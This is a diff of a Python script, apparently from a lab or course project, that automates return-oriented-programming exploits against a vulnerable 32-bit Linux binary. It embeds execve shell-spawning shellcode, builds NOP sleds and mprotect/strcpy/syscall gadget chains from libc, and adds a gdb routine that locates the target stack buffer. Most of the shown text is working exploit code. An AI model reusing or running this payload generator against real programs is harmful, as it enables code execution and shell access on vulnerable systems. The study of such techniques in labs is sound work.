@@ -8,11 +8,7 @@ import os
 import io
 
 register_list = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"]
-#krishnan machine
-#buf_address = 0xbffff138
 
-#neeraj machine
-buf_address = 0xbffff158 
 buf_len = 256
 packed_shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 
@@ -497,7 +493,7 @@ def gfind_syscall(gadgetMap):
     print "gfind_syscall - 0"
     return 0
 
-def build_rop_chain_syscall_generic(lib_list):
+def build_rop_chain_syscall_generic(lib_list, buf_address):
     minus_one = 0xffffffff
     dummy_gadget = 0x11111111
     rop_payload = ""
@@ -605,9 +601,9 @@ def build_rop_chain_syscall_generic(lib_list):
 
     rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload
 
-    print_rop_payload(rop_payload)
+    return rop_payload
 
-def build_rop_chain_libc_syscalls(lib_list):
+def build_rop_chain_libc_syscalls(lib_list, buf_address):
 
     rop_payload = ""
   
@@ -738,14 +734,14 @@ def build_rop_chain_libc_syscalls(lib_list):
 
     rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload + syscall_addr + pack_value(buf_address) 
 
-    print_rop_payload(rop_payload) 
+    return rop_payload 
 
 
-def build_rop_chain_libc(lib_list):
-    libc_base_address = 0xb7e05000
-    f = open("/lib/i386-linux-gnu/libc.so.6", 'rb')
+def build_rop_chain_libc(lib_list, buf_address):
+    libc_base_address = lib_list[0][1]
+    f = open(lib_list[0][2], 'rb')
     if f == None:
-        print 'libc library not found !'
+        print lib_list[0][2] + "library not found !"
         exit(2)
     elffile = ELFFile(f)
 
@@ -780,7 +776,7 @@ def build_rop_chain_libc(lib_list):
     mprotect_arguments = pack_value(memory_start_address) + pack_value(memory_length) + pack_value(permissions)
 
     rop_payload = ""
-    rop_payload += mprotect_addr + pop3_addr + mprotect_arguments.replace("\x00", "\x7f") + pack_value(buf_address)
+    rop_payload += mprotect_addr + pop3_addr + mprotect_arguments.replace("\x00", "\xff") + pack_value(buf_address)
 
     strcpy_dest_list = []
     strcpy_dest = buf_address + buf_len + 4 + (7 * 16) + 8 + 0 - 0x00
@@ -805,7 +801,7 @@ def build_rop_chain_libc(lib_list):
 
     rop_payload = nop_sled + packed_shellcode + 9 * ret_addr + rop_payload
 
-    print_rop_payload(rop_payload) 
+    return rop_payload 
 
 def print_rop_payload(buf):
     rows, columns = os.popen('stty size', 'r').read().split()
@@ -881,6 +877,22 @@ def find_library_base_addr(vuln_binary, library_path):
     os.remove("./test.gdb")
     return library_base_addr
 
+def find_buffer_addr(vuln_binary, payload_length):
+    with io.FileIO("find_buf.gdb", "w") as file:
+        file.write("b main\nrun " + "A"*payload_length +"\np/x &buf[0]\n")
+
+    cmd = "gdb --batch --command=./find_buf.gdb --args ./mprotect-shellcode/vuln2 " + "A"*payload_length + "|tail -1|awk '{print $3}'"
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+    proc.wait()
+    try:
+        buffer_addr = int(proc.stdout.read(), 16)
+    except Exception as e:
+        print "Error finding library base address %s" %(str(e))
+        return 0
+
+    os.remove("./find_buf.gdb")
+    return buffer_addr
+
 def compile_binary(libraries):
     rm_command = "rm -rf ./mprotect-shellcode/vuln2"
     rmproc = subprocess.Popen(rm_command, shell=True, stdout=subprocess.PIPE)
@@ -921,7 +933,16 @@ if __name__ == '__main__':
             exit(1)
         lib_list.append((disas_map, base_addr, entry))
     
-    #build_rop_chain_libc_syscalls(lib_list)
-    #build_rop_chain_libc(lib_list)
-    build_rop_chain_syscall_generic(lib_list)
+    rop_payload = ""
+
+    if (len(libraries) == 1) and (libraries[0].count("libc") == 1):
+        buffer_address = find_buffer_addr(vuln_bin, 392)
+        rop_payload = build_rop_chain_libc(lib_list, buffer_address)
+    else:
+        buffer_address = find_buffer_addr(vuln_bin, 416)
+        rop_payload = build_rop_chain_syscall_generic(lib_list, buffer_address)
+
+    #build_rop_chain_libc_syscalls(lib_list, buf_address)
+
+    print_rop_payload(rop_payload)
 
